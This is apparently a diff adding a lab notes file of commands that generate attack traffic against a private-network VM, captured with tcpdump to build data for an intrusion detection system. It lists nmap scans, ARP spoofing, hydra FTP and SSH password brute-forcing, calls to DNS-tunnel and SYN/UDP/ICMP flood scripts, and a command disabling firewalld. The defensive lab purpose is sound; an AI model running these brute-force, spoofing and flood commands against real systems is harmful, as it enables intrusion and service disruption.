@@ -1,0 +1,80 @@
+First cd De*/abc
+
+reconnaissance
+nmap -sV 192.168.122.24
+sudo nmap -O 192.168.122.24
+sudo nmap -A 192.168.122.24
+sudo tcpdump -i enp1s0 -w reconnaissance_01.pcap
+
+
+arpspoof
+sudo arpspoof -i virbr0 -t 192.168.122.24 192.168.122.1
+sudo tcpdump -i any -w arpspoof_01.pcap
+ip rout
+192.168.122.1
+
+/* dns tunnel
+python scripts/dns_tunnel.py
+sudo tcpdump -i any -w dnstunnel_02.pcap */
+
+/* FTPBruteForce
+sudo ss -tlnp | grep :21
+hydra -l vtm12 -P scripts/pwds.txt ftp://192.168.122.24 -I
+sudo tcpdump -i any -w ftp_bruteforce_01.pcap
+sudo ss -tlnp | grep :21 */
+
+
+ssh_bruteforce
+hydra \
+-l vtm \
+-P scripts/pwds.txt \
+ssh://192.168.122.24 -I
+sudo tcpdump -i any -w ssh_bruteforce_01.pcap
+sudo ss -tlnp | grep :22
+
+ICMP
+sudo .venv/bin/python scripts/icmp.py
+sudo tcpdump -i any -w icmpflood_01.pcap
+
+UDP
+sudo .venv/bin/python scripts/udp.py
+sudo tcpdump -i any -w udpflood_01.pcap
+
+SYN
+sudo .venv/bin/python scripts/syn.py
+sudo tcpdump -i any -w synflood_01.pcap
+
+Port Scan
+sudo tcpdump -i any -w portscan.pcap
+#!/bin/bash
+
+TARGET="192.168.122.24"
+
+echo "[*] TCP Connect Scan"
+nmap -sT "$TARGET"
+
+echo
+echo "[*] Fast Scan"
+nmap -F "$TARGET"
+
+echo
+echo "[*] Full Port Scan"
+nmap -p- "$TARGET"
+
+echo
+echo "[*] Version Detection"
+nmap -sV "$TARGET"
+
+echo
+echo "[+] All scans completed."
+
+
+/* Normal
+ sudo bash ./scripts/nromal.sh
+ sudo tcpdump -i any -w normal.pcap */
+ 
+ 
+ sudo .venv/bin/python live_ids.py
+ sudo .venv/bin/python app.py
+ 
+ sudo systemctl stop firewalld
